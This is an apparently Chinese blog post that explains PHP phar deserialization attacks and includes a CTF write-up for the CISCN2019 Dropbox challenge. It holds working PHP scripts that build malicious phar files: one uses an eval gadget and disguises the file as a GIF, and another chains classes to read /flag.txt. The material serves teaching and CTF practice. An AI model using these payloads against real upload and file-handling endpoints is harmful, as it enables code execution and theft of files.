@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>phar反序列化总结 | rhoeoeoeoeoeo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phar反序列化总结">
+<meta property="og:url" content="http://example.com/2021/11/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="rhoeoeoeoeoeo">
+<meta property="og:description" content="-">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-17T08:03:44.925Z">
+<meta property="article:modified_time" content="2021-11-17T08:06:48.040Z">
+<meta property="article:author" content="rhoeo">
+<meta property="article:tag" content="phar反序列化">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="rhoeoeoeoeoeo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">rhoeoeoeoeoeo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-phar反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2021-11-17T08:03:44.925Z" itemprop="datePublished">2021-11-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      phar反序列化总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>-</p>
+<span id="more"></span>
+
+
+<p>在不使用unserialize()的情况下出发php反序列化漏洞：<br>原理是：<br>phar 是php归档文件，可以不经过解压被php访问执行<br>Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</p>
+<h1 id="所需要的条件"><a href="#所需要的条件" class="headerlink" title="所需要的条件"></a>所需要的条件</h1><p>php archive  php中的打包文件<br>在php5.3+开启<br>生成phar文件需要 php.ini中 phar.readonly=off</p>
+<p>phar文件可以上传到服务器端<br>有可用的魔术方法<br>文件系统函数(file_exists(),is_dir()等)的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
+<h1 id="序列化应该知道的东西"><a href="#序列化应该知道的东西" class="headerlink" title="序列化应该知道的东西"></a>序列化应该知道的东西</h1><p>类的成员由属性和方法构成，序列化一个对象将会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。</p>
+<h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><ol>
+<li>stub（桩代码）（符合标准的临时性待编辑代码）<br>必须以 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>
+结尾</li>
+<li>描述内容的清单<br>被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</li>
+<li>文件内容<br>构造时随意填写</li>
+<li>签名<br>16/20+4+4</li>
+</ol>
+<p>，通过phar://协议对一个phar文件进行文件操作，如file_get_contents，就可以触发反序列化， 因为在phar.c#L618处，其调用了 php_var_unserialize：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>本地建立 phar.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o -&gt; data=&#x27;hu3sky&#x27;;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>获得文件中$o数据遭遇序列化！<br>序列号和反序列化！<br>众所周知 phar://协议会解析phar文件 会将meta-data反序列化<br>具体受影响函数看<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a><br>实验 phar://反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(&#x27;phar://phar.phar&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>观察phar文件是可以看到meta-data文件是被序列化过的</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>写phar.phar 文件<br>进行一些常规的后缀之类的绕过<br>上传后 利用一些魔法函数自动反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$object = new AnyClass();</span><br><span class="line">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line">(这里面的class 应该与所给有魔法函数的classname相同)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>[CISCN2019 华北赛区 Day1 Web1]Dropbox</p>
+<p>按照惯例和经验，我们上传的文件是放在 网站主目录/sandbox/hash 目录下的，所以要想下载php文件必须跳转到上级目录，<br>下载 ../../index.php</p>
+<p>代码审计<br>最先看一些 config.php class.php function.php<br>在class.php中可以看到file类中有file_get_contents函数 读取/flag.txt文件（这是目标）<br>可以调用file的方法的是 filelist 的 __call 函数<br>这是在close()功能内<br>而在user的解构函数__destruct内 存在 $this-&gt;db-&gt;close();<br>会自动调用db变量的close()方法<br>那么db变量可以直接作为file类的对象吗？<br>可以 但是调用不了他的方法<br>所以要通过 filelist 的 __call 中转一下<br>写序列号脚本<br>正序过来就是<br>定义一个filelist类的变量db=/flag.txt，db传入user类中，引发解构函数，到filelist下的__call，从而利用file的function函数，file_get_contents</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//phpinfo();</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;</span><br><span class="line">        $this-&gt;files = array($file);</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);#删除phar.phar</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();#提高性能，好像不必要</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new User();</span><br><span class="line">$o-&gt;db = new FileList();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>filename=phar://phar.png<br>flag{b3d55a13-3b32-4a21-aa0f-02042c4ae154}</p>
+<p>phar的格式<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011474028/article/details/54973571">https://blog.csdn.net/u011474028/article/details/54973571</a><br>phar://的利用<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+<p>2018 hitcon baby cake<br>一个复现的wp <a target="_blank" rel="noopener" href="https://www.codercto.com/a/33634.html">https://www.codercto.com/a/33634.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/11/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckw38rvb60001a0uxc9jmb1ha" data-title="phar反序列化总结" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">phar反序列化</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/19/xxe%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">xxe的一些了解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/challenge/">challenge</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xml/" rel="tag">xml</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">phar反序列化</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/xml/" style="font-size: 10px;">xml</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/11/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/19/xxe%E6%94%BB%E5%87%BB/">xxe的一些了解</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/10/preg_replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace代码执行</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/03/rce/">rce的小整理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 rhoeo<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
